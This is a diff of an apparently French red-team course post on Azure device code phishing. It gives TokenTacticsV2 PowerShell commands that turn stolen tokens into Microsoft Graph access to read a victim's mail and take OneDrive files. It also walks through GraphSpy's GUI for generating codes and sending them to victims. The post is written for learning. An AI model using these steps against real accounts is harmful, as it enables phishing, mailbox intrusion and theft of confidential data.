@@ -1,6 +1,7 @@
++++
 author = "Enzo"
-title = "Azure - OSINT"
-date = "2026-06-29"
+title = "Phishing - Device Code"
+date = "2026-09-21"
 categories = [
     "Red Team"
 ]
@@ -10,6 +11,7 @@ tags = [
     "Azure",
     "Cours"
 ]
++++
 # Phishing - Device Code
 ## C'est quoi ? 
 L'attaque par ``Device Code Phishing``, est (comme son nom l'indique) une attaque de phishing. Elle à été découverte par ``@DRAzureAD`` (le créateur de ``AADInternals``). C'est une méthode très pertinante car elle est plus compliqué à détecter que le phishing OAuth classique, et surtout elle est plus simple à mettre en place.
@@ -20,7 +22,7 @@ L'attaque ce décompse en 3 étapes que nous vérrons dans cet article.
 
 
 ** Les codes et tokens présent dans ce post sont tous 
-## Exploitation
+## Exploitation CLI
 
 ### Installation
 [https://github.com/f-bader/TokenTacticsV2.git](https://github.com/f-bader/TokenTacticsV2.git)
@@ -92,30 +94,12 @@ Une fois les tokens récupéré, il nous suffit de les mettres dans ``Burp Suite
 
 ### Accès à la boîte mail
 
+````Powershell
+Invoke-RefreshToMSGraphToken -Domain domaine.fr
+$hGraph = @{Authorization = "Bearer $($MSGraphToken.access_token)"}
+Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $hGraph
 ````
-RefreshTo-OutlookToken -Domain domaine.com
-✓  Token acquired and saved as $OutlookToken
-
-token_type     : Bearer
-scope          : https://outlook.office365.com/Branford-Internal.ReadWrite
-                 https://outlook.office365.com/Calendars.ReadWrite
-                 https://outlook.office365.com/Calendars.ReadWrite.Shared
-                 https://outlook.office365.com/Contacts.ReadWrite
-                 https://outlook.office365.com/Contacts.ReadWrite.Shared
-                 https://outlook.office365.com/CoreItem-Internal.Write.All
-                 https://outlook.office365.com/CoreItem-Internal.Write.Shared
-                 https://outlook.office365.com/EAS.AccessAsUser.All
-                 https://outlook.office365.com/EopPolicySync.AccessAsUser.All
-                 https://outlook.office365.com/EopPsorWs.AccessAsUser.All
-                 https://outlook.office365.com/EWS.AccessAsUser.All https://outlook.office365.com/Files.Read.Sdp
-                 https://outlook.office365.com/Files.ReadWrite.All
-                 https://outlook.office365.com/Files.ReadWrite.Shared
-                 [...]
-                 https://outlook.office365.com/user_impersonation
-                 https://outlook.office365.com/User-Internal.ReadWrite https://outlook.office365.com/.default
-expires_in     : 8427
-ext_expires_in : 8427
-````
+Cette commande nous donnera accès (+ ou -) visuel à la boîte mail de notre victime. Ici, je ne peut pas vous montrer le contenu de ma boîte mail vu qu'il y a du contenu confidentiel...
 
 ### Télécharger des fichiers du OneDrive
 
@@ -151,3 +135,50 @@ ls
 CONFIDENTIEL - Mot De Passe.xlsx
 ````
 Et voilà, nous pouvons maintenant le fichier téléchargé.
+
+## Exploitation GUI
+### Installation
+Pour la version "GUI" l'insallation se fera par ``pipx``. L'installation est très simple.
+Voici les étapes d'installation : 
+````Shell
+apt install pipx
+pipx ensurepath
+pipx install graphspy
+````
+Voila GraphSpy est installé, voyons comment il fonctionne.
+
+### Créatoin du code
+Pour créer le code il faut d'abord lancer notre outil avec la commande suivante : 
+````Shell
+graphspy
+````
+Ce qui nous donne : 
+````Shell
+
+   ________                             _________
+  /       /  by RedByte1337    __      /        /      v1.8.1
+ /  _____/___________  ______ |  |__  /   _____/_____ ______
+/   \  __\_  __ \__  \ \____ \|  |  \ \_____  \\____ \   |  |
+\    \_\  \  | \/  __ \|  |_> |   \  \/        \  |_> \___  |
+ \______  /__|  |____  |   __/|___|  /_______  /   ___/ ____|
+        \/           \/|__|        \/        \/|__|   \/
+
+2026-09-21 00:28:38.353 (UTC+02:00) [i] Utilizing database '/Users/enzo/.local/share/graphspy/databases/database.db'
+2026-09-21 00:28:38.577 (UTC+02:00) [i] Starting GraphSpy. Open in your browser by going to the url displayed below.
+
+2026-09-21 00:28:38.587 (UTC+02:00) [i] Serving on http://127.0.0.1:5000
+````
+Ici nous avons l'information que l'interface graphique tournera sur le port 5000 de notre machine allons voir ce qu'il s'y passe : 
+![GraphSpy Home](image-1.png)
+
+Pour la création des "Device Code" nous devosn nous rendre dans `Authentication` > `Device Codes` 
+![Device Code](image-2.png)
+
+Une fois dans la page `Device Codes`, nous pouvons y voir : 
+![Device Code Creation](image-3.png)
+ - En blanc : lien qui renvoie vers l'association d'appareil
+ - En vert : les comptes qui ont déjà été "phishé"
+
+Pour créer le code, il suffit d'appuyer sur `Generate Device Code`. Cela va nous créer une nouvelle ligne dans la catégorie verte (ci dessus) il faudra envoyer le code à notre victime avec un des liens dans la catégorie blanche (ci dessus). Une fois l'appareil lié au compte de la victime, il apparaitra en vert. Nous pourrons ensuite voir les mails dans `Outlook` > `Web | Graph`, nous pouvons également consulter et télécharger ses fichiers dans `Files` > `OneDrive`. 
+
+Je vous laisse découvrir cet outil car il peut être extremement utile.
